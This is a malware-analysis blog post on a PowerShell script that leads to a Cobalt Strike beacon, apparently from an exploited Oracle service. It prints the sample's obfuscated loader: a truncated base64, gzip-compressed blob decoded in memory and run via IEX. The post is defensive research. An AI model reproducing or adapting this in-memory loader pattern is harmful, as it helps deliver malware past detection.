---
title: "Cobalt Strike Beacon Analysis"
categories:
  - Malware Analysis
header:
  teaser: "/assets/images/CobaltStrikeBeaconAnalysis1/1.png"
---

Cobalt Strike, which was originally developed as a legitimate security tool used for adversary emulation by Red Teams, has become a double-edged sword in the realm of cybersecurity. Malicous actors have cracked the software, since then it's been abused by adversaries ranging from hacktivists to APTs to fufill their needs. This is article is an analysis of the PowerShell script that leads to execution of a Cobalt Strike beacon.  

## Discovery

I recently discovered this malicious PowerShell script from a [Twitter post by @xorJosh](https://twitter.com/xorJosh/status/1655905247334735878). In his tweet he described an Oracle related service was exploited to download and execute a PowerShell script.

[![1](/assets/images/CobaltStrikeBeaconAnalysis1/1.png)](/assets/images/CobaltStrikeBeaconAnalysis1/1.png)

The malware sample mentioned can be found on [MalwareBazaar](https://bazaar.abuse.ch/sample/9c9e8841d706406bc23d05589f77eec6f8df6d5e4076bc6a762fdb423bfe8c24/)

## Static Analysis

```ruby
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAA/+y9Wa/qSrIu+rzrV8yHLa21xNo1wBhjjrSla2wwxh09mDqlkjHgBtw3YM49//1GZBoGY865VtXW1rkPV3dKUwyMnU1kNF9ERqSXp+I/lkXmO4UeH0/f/mNzynI/jr4xf/nLuYycAv/GP/7hnop/JFns/MM+HrNTnn/7X3/5t
....QUA"));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```
